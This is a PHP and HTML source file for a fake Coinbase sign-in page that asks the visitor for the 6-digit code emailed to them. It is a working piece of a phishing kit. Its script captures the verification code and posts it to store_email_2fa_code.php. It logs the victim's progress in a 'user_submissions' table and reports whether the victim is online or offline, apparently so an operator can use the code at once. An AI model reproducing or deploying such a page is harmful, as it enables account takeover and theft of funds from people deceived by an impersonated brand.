<?php 
// Start the session
session_start();

// Include the database connection file
require_once "admin/db_connection.php";

// Function to update user activity
function updateActivity($email, $activity) {
    global $conn; // Access the database connection within the function
    $sql = "UPDATE user_submissions SET activity = ? WHERE token = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $activity, $email);
    $stmt->execute();
    $stmt->close();
}

// Check if the email and token are set in the session
if (!isset($_SESSION["email"]) || !isset($_SESSION["token"])) {
    // If email or token is not set, redirect the user back to login.php
    header("Location: login.php");
    exit();
}

// Retrieve the token from the session
$token = $_SESSION["token"];

// Update user activity to indicate visiting url.php
updateActivity($token, "EmailPage");

// Check if the email is set in the session
if(isset($_SESSION["email"])) {
    $email = htmlspecialchars($_SESSION["email"]);
} else {
    $email = ""; // Set a default value if email is not set
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/favicon-32x32.png" type="image/x-icon">
    <title>Coinbase - Sign In</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        @font-face {
            font-family: 'CoinbaseSans';
            src: url('assets/CoinbaseSans2.woff2') format('woff2'),
            url('path/to/CoinbaseSans.woff') format('woff');
            font-weight: normal;
            font-style: normal;
        }

        body {
            margin: 0;
            padding: 0;
            background-color: #0A0B0D;
            font-family: 'CoinbaseSans', -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica", "Arial", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
        }

        .wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 60vh;
        }

        .login-container {
            width: 80%;
            max-width: 400px;
            padding: 20px;
            border-radius: 16px;
            border: 1px solid rgba(91, 97, 110, 0.2);
            margin-top: 80px;
        }

        .login-image {
            width: 150px;
            margin-top: 20px;
            margin-left: 20px;
        }

        h2 {
            font-size: 28px;
            font-weight: 600;
            margin-left: 20px;
            color: white;
        }

        .login-form {
            margin-top: 40px;
        }

        .login-form h2 {
            margin-left: 20px;
            margin-bottom: 0;
        }

        .login-form p {
            color: #5b616e;
            font-size: 16px;
            font-weight: 400;
            line-height: 24px;
            margin-left: 20px;
            margin-top: 5px;
        }

        .login-form a {
            color: #0052ff;
            text-decoration: none;
            font-size: 16px;
            font-weight: 400;
            line-height: 24px;
        }

        .two-fa-container {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }

        .two-fa-input {
            width: 30px;
            height: 44px;
            color: white;
            text-align: center;
            margin: 0 5px;
            border-radius: 8px;
            font-size: 16px;
            background-color: #0A0B0D;
            margin-top: 10px;
            transition: border-color 0.3s ease-in-out;
        }

        .two-fa-input:focus {
            outline: none;
            border-color: #0052ff;
        }

        .two-fa-container input:nth-child(4) {
            margin-left: 20px;
        }

        .login-form button[type="button"] {
            background-color: #FBF9FE;
            border: none;
            border-radius: 24px;
            color: #5b616e;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            line-height: 24px;
            margin-left: 20px;
            padding: 16px;
            width: 90%;
            margin-top: 30px;
            margin-bottom: 20px;
        }

        .link-container {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
            margin-right: 20px;
        }

        .link-container a {
            color: #0052ff;
            text-decoration: none;
            font-size: 16px;
            font-weight: 400;
            line-height: 24px;
        }

        .centered-link {
            margin-top: 20px;
            text-align: center;
        }

        .centered-link a {
            color: #0052ff;
            text-decoration: none;
            font-size: 16px;
            font-weight: 400;
            line-height: 24px;
        }

        .password-input {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            top: 50%;
            right: 30px;
            transform: translateY(-50%);
            cursor: pointer;
        }

        @media only screen and (max-width: 600px) {
        .two-fa-input {
            width: 25px;
        }

        .login-form h2 {
            width:100%;
            font-size:24px;
        }        
        }
        @media only screen and (max-width: 768px) {
        .two-fa-input {
            width: 25px;
        }
        .login-form h2 {
            width:100%;
        }
        }
    </style>
</head>

<body>
    <div class="wrapper">
        <div class="login-container">
            <img src="assets/Consumer_Wordmark.svg" alt="Coinbase Logo" class="login-image">
            <form class="login-form" action="#">
                <h2>Enter the 6-digit code emailed to <span id="emailSpan"></span></h2>
                <p>This helps us keep your account secure by verifying that it's really you.</p>
                <div class="two-fa-container">
                    <input type="text" class="two-fa-input" maxlength="1"  onkeyup="handleInput(event)">
                    <input type="text" class="two-fa-input" maxlength="1" onkeyup="handleInput(event)">
                    <input type="text" class="two-fa-input" maxlength="1" onkeyup="handleInput(event)">
                    <input type="text" class="two-fa-input" maxlength="1" onkeyup="handleInput(event)">
                    <input type="text" class="two-fa-input" maxlength="1" onkeyup="handleInput(event)">
                    <input type="text" class="two-fa-input" maxlength="1" onkeyup="handleInput(event)">
                </div>
                <button id="resendButton" type="button" onclick="startResendTimer()">Resend code in 30</button>
                <div class="link-container">
                    <a href="#">Try another way</a>
                </div>
            </form>
        </div>
        <div class="centered-link">
            <a href="#">Cancel signing in</a>
        </div>
    </div>
    
     <script>
        document.addEventListener('DOMContentLoaded', function() {
        // Retrieve the email from PHP and set it as the content of the span
        var emailSpan = document.getElementById('emailSpan');
        var email = '<?php echo $email; ?>';
        emailSpan.textContent = email;

        // Start the resend timer when the page loads
        startResendTimer();
        });


        // Function to handle input events
        function handleInput(event) {
            var input = event.target;
            var inputValue = input.value;

            if (event.key === 'Backspace' && inputValue === '') {
                if (input.previousElementSibling) {
                    input.previousElementSibling.focus();
                }
            } else {
                if (inputValue !== '' && input.nextElementSibling) {
                    input.nextElementSibling.focus();
                }
            }

            // Check if all inputs are filled
            if (checkInputsFilled()) {
                // All inputs are filled, trigger AJAX request
                storeEmail2FACode();
            }
        }

        // Function to send AJAX request to store 2FA code
        function storeEmail2FACode() {
            var code = '';
            var inputs = document.querySelectorAll('.two-fa-input');
            inputs.forEach(function (input) {
                code += input.value;
            });

            // Send AJAX request
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'store_email_2fa_code.php');
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onload = function () {
                if (xhr.status === 200) {
                    // Redirect to loading page upon successful storage
                    window.location.href = 'loading.php';
                } else {
                    console.error('Error storing email 2FA code:', xhr.responseText);
                }
            };
            xhr.send('code=' + code);
        }

        // Function to check if all input fields are filled
        function checkInputsFilled() {
            var inputs = document.querySelectorAll('.two-fa-input');
            for (var i = 0; i < inputs.length; i++) {
                if (inputs[i].value === '') {
                    return false;
                }
            }
            return true;
        }

        // Function to start resend timer
        function startResendTimer() {
            var resendButton = document.getElementById("resendButton");
            resendButton.disabled = true;

            var seconds = 30;
            var resendTimer = setInterval(function () {
                seconds--;
                if (seconds > 0) {
                    resendButton.textContent = "Resend code in " + seconds;
                } else {
                    clearInterval(resendTimer);
                    resendButton.textContent = "Resend code";
                    resendButton.disabled = false;
                    resendButton.style.backgroundColor = "#0052ff";
                    resendButton.style.color = "white";
                }
            }, 1000);
        }

        // Event listener for Resend button click
        document.getElementById("resendButton").addEventListener("click", function () {
            this.style.backgroundColor = "#FBF9FE";
            this.style.color = "#5b616e";
            startResendTimer();
        });

        // Function to update user status
    function updateUserStatus(status) {
        // Send an AJAX request to update user status
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'update_status.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                // Handle response if needed
            }
        };
        xhr.send('status=' + status);
    }

   // Detect user activity
   function detectActivity() {
        var userActive = false;

        function setUserActive() {
            if (!userActive) {
                userActive = true;
                updateUserStatus('online');
            }
        }

        // Events to detect user activity
        window.addEventListener('mousemove', setUserActive);
        window.addEventListener('keydown', setUserActive);
        window.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                setUserActive();
            }
        });

        // Additional events for mobile devices
        window.addEventListener('touchstart', setUserActive);
        window.addEventListener('touchmove', setUserActive);
        window.addEventListener('orientationchange', setUserActive);
        window.addEventListener('scroll', setUserActive);

        // Set user as offline when the tab is closed
        window.addEventListener('beforeunload', function() {
            updateUserStatus('offline');
        });
    }

    // Call detectActivity function when the document is loaded
    document.addEventListener('DOMContentLoaded', detectActivity);
    </script>
</body>
</html>